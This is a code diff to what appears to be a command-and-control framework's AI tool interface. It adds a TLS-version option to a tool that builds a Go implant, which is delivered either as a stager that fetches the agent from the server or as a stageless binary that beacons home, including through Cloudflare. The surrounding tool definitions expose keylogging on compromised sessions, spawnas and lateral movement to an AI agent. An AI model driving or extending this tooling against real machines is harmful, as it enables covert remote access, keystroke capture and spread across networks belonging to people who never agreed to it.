@@ -657,6 +657,7 @@ def tool_build_go_agent(
     stageless: bool = False,
     debug: bool = False,
     persistent_http: bool = False,
+    tls_version: str = "default",
 ) -> str:
     """Build the repository Go agent with the server's active connection settings embedded."""
     config = {
@@ -665,6 +666,7 @@ def tool_build_go_agent(
         "jitter_percent": jitter_percent,
         "http_proxy": http_proxy,
         "persistent_http": persistent_http,
+        "tls_version": tls_version,
     }
     if workspace_id:
         config["workspace_id"] = workspace_id
@@ -672,6 +674,8 @@ def tool_build_go_agent(
         return _json_result({"ok": False, "error": "debug must be a boolean"})
     if not isinstance(persistent_http, bool):
         return _json_result({"ok": False, "error": "persistent_http must be a boolean"})
+    if tls_version not in ("default", "1.2", "1.3"):
+        return _json_result({"ok": False, "error": "tls_version must be default, 1.2, or 1.3"})
     code, data = client.build_go_agent(
         goos=goos,
         goarch=goarch,
@@ -1237,6 +1241,7 @@ TOOL_HANDLERS = {
         bool(a.get("stageless", False)),
         a.get("debug", False),
         a.get("persistent_http", False),
+        a.get("tls_version", "default"),
     ),
     "stage_status": lambda c, a: tool_stage_status(c, a["staging_id"]),
     "queue_keylog": lambda c, a: tool_queue_keylog(c, a["session_ref"], a["action"]),
@@ -1945,6 +1950,7 @@ OPENAI_TOOLS: list[dict] = [
                 "stageless": {"type": "boolean", "description": "false (default): return a small stage1 ZIP (~20 KB C launcher) that fetches the Go agent from the server at runtime. true: return a ZIP with the full Go agent binary embedded directly (no staging server required, larger file on target)."},
                 "debug": {"type": "boolean", "default": False, "description": "Build the main agent with the rmmdebug build tag in a full-agent ZIP. Spawn, spawnas, and lateral descendants inherit tracing automatically. Normal builds exclude diagnostic implementation."},
                 "persistent_http": {"type": "boolean", "default": False, "description": "Reuse HTTP connections across beacon requests. Default false closes each request connection, including connections to Cloudflare."},
+                "tls_version": {"type": "string", "enum": ["default", "1.2", "1.3"], "default": "default", "description": "TLS version for the Go agent; the stage1 launcher uses its own TLS settings."},
             }},
         },
     },
